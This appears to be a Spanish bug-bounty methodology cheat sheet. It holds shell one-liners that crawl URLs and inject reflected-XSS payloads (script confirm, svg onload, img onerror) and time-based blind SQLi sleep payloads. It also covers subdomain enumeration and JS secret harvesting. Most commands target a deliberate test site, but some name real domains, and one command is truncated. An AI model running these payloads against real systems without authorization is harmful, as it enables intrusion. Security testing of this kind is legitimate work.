#nulldev96_Metodology

*Provando todas las herramientas para encontar posible "XSS"* 

|||||||||||||||||||||||||||||||_FIND "XSS" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

    
#****_Forma rapida de busqueda _XSS_ ======> "echo | way | anew | cat | egrep | gf | qsreplace | while | curl | grep_****

     echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js)" | gf xss | qsreplace '"><script>confirm(1)</script>' | anew qsrepl2.json && cat qsrepl2.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss" | tee vuln_xss

#****_Forma rapida de busqueda _XSS_ ======> "echo | way | gf | qsreplace | while | curl | grep |"_****
     
     echo "testphp.vulnweb.com" | waybackurls | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss"
              
#****_Forma rapida de busqueda _XSS_ ======> "echo | way | anew | cat | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" > filtrado_url.txt && cat filtrado_url.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | tee filtre.txt&& cat filtre.txt | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" |  kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | httpx | Gxss | dalfox"_**** 
     
     echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox p     

#****_Forma rapida de busqueda _XSS_ ======>  "Paramspider.py | qsreplace | airixss | grep"_****
     
     /home/josema96/HackerOne/hunters_tools/TOOLS_funsion/tool_Search_parametro/ParamSpider/paramspider.py -d testphp.vulnweb.com -o param.txt ; cat output/param.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | dalfox"_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>   "way | urldedupe | bhedak |  airixss | egrep"_****
     
     waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | uro | httpx | qsreplace | airixss | grep"_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | uro | qsreplace | airixss | grep"_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' 

#****_Forma rapida de busqueda _XSS_ ======>    "waymore.py | cat | gf | dalfox"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | Gxss | dalfox pipe

#****_Forma rapida de busqueda _XSS_ ======>   "echo | cariddi | qsreplace | grep | airixss | grep"_****
     
     echo "http://testphp.vulnweb.com" | cariddi | qsreplace '"><svg onload=confirm(1)>' | grep "=" | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>   "waymore | cat | anew | qsreplay | airixss | grep"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt |  anew | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_Forma rapida de busqueda _XSS_ ======>   "waymore | cat | gf xss | qsreplay | freq | grep"_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'

#****_Forma rapida de busqueda _XSS_ ======>  "katana | urldedupe | bhedak | airixss | egrep"_****
     
     katana -u http://testphp.vulnweb.com -o crawlin.txt;cat crawlin.txt | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'


##############################################################################################

  |||||||||||||||||||||||||||||||_FIND "XSS_BLING" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

#****_Forma rapida de busqueda _XSS_ ======>  "echo | way | gf | qsreplace | jeecves | grep"_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 | grep "Vulnerable To Time-Based SQLI"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | jeeves | grep"_****   
     
     echo "http://testphp.vulnweb.com" | waybackurls | jeeves --payload-time 5 | grep "Vulnerable To Time-Based"

#****_Forma rapida de busqueda _XSS_ ======>   "echo | way | gf | qsreplace | jeeves | grep"_**** 
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 -H "Testing: testing;OtherHeader: Value;Other2: Value" | grep "Vulnerable To Time-Based"

#****_Forma rapida de busqueda _XSS_ ======>    "cat | Seclists | while | echo | gau | qsreplace | jeeves"_**** 
     
     cat /usr/share/wordlists/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt | while read payload;do echo http://testphp.vulnweb.com | gau | qsreplace $payload | jeeves -t 5;done

##############################################################################################

#****_Forma rapida de busqueda subdominio  ====>  sublist3r | amass | subfinder | assetfinder |findomain | crobat | anubis | turbolist3r.py | python3 SubDomainizer.py | acamar.py | ctfr.py | github-subdomains.py_****

    sublist3r -d {dominio} >> sub.txt  | amass enum -d {dominio}  >> sub.txt | subfinder -d {dominio} >> sub.txt | assetfinder --subs-only {dominio} >> sub.txt | findomain -t {dominio}  >> sub.txt | crobat -s {dominio} >> sub.txt | anubis -t {dominio}  -S  >> anub.txt | turbolist3r.py -d {dominio} >> sub.txt | python3 SubDomainizer.py -u {dominio} >> sub.txt | acamar.py {dominio} 2> /dev/null | grep $dominio >> sub.txt | ctfr.py -d {dominio} >> subdomain.txt | github-subdomains.py -t {token} -d {dominio} >> sub.txt | cat sub.txt | anew subdomain.txt ; rm sub.txt && cat subdomain.txt


# Time_tool
#****_Forma rapida de busqueda o crawling History_URL ====>  "echo | waybackurls | gau | gauplus | cariddi | katana"_**** 
    
    echo "testphp.vulnweb.com" | waybackurls | anew url1.txt 
    echo "http://testasp.vulnweb.com/" | gau | anew url.txt
    echo "http://testasp.vulnweb.com/" | gauplus | anew url.txt
    echo "http://testphp.vulnweb.com" | cariddi  | anew url.txt
    echo "vulnweb.com" | subfinder -silent | httpx -silent | cariddi -intensive
    katana -u http://testphp.vulnweb.com -o crawlin.txt
    python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt
    subfinder -d vulnweb.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)'
    subfinder -d vulnweb.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json
    #Multiple URL Input (comma-separated)
    katana -u http://testphp.vulnweb.com,http://testasp.vulnweb.com
    #List Input
    katana -list url_list.txt
    

#****_CREANDO UN SCRIPT QUE AUTOMATICE LA URL DEL SITIOS WEB ANTIGUA_****

    !/usr/bin/bash

    #Extrae todas la url de un sitios web y filtarar  loa mas intresante

    domain=$1

    extraer_URL(){
            mkdir -p $domain $domain/URL
            echo $domain | gauplus | tee $domain/URL/gau.txt
            cat $domain/URL/gau.txt | sort -u | tee $domain/URL/u.txt
    #egrep -iv ".(jpg|jpeg|png|svg|git|woff|woff2|pdf|ico|tif|tiff|css)" | tee $domain/URL/url_filt.txt
            echo $domain | waybackurls | tee $domain/URL/wayback1.txt
            cat $domain/URL/wayback1.txt | sort -u | tee $domain/URL/a.txt
    #egrep -iv ".(jpg|jpeg|png|svg|git|woff|woff2|pdf|ico|tif|tiff|css)" | tee $domain/URL/url1.txt
            cat $domain/URL/*.txt 2> /dev/null > $domain/URL/all_url
            rm $domain/URL/*.txt 2> /dev/null

    }
    extraer_URL
    
#****_Forma rapida de busqueda de archivo _.js_ ====>  "echo | waybackurls"_****

    #SEARCH .json
       gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $5}' | fff | grep -v 404
    #SEARCH .json filter anti-burl
       gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $5}' | anti-burl | grep -v 404
    #SEARCH .json filter fff
       echo "http://testphp.vulnweb.com" | waybackurls | grep -E "\.js(?:onp?)?$"  | fff | grep -v 404
       echo "http://testphp.vulnweb.com" | gau | grep -E "\.js(?:onp?)?$" | fff | grep -v 404 
       echo "http://testphp.vulnweb.com" | gauplus | grep -E "\.js(?:onp?)?$" | fff | grep -v 404
       echo "testphp.vulnweb.com" | gau  | subjs | fff | grep -v 404
    #SEARCH .json subdomain
       assetfinder -subs-only vulnweb.com | waybackurls | grep -E "\.json(?:onp?)?$" | hakcheckurl | grep -v 404
    #Usando búsqueda de chaos js
       chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
    #Usando echo | wayback | grep | sort | >
       echo "testphp.vuln.com" | waybackurls | grep -iE '\.js' | grep -ivE '\.json' | sort -u  > j.txt
    #SEARCH .js USING
       assetfinder -subs-only testphp.vulnweb.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$"  | hakcheckurl | grep -v 404
    #Recopila .js gau+wayback+gospider y hace un análisis del js.
       cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> 200Js.txt ; xargs -a 200Js.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat 200Js.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'   
    
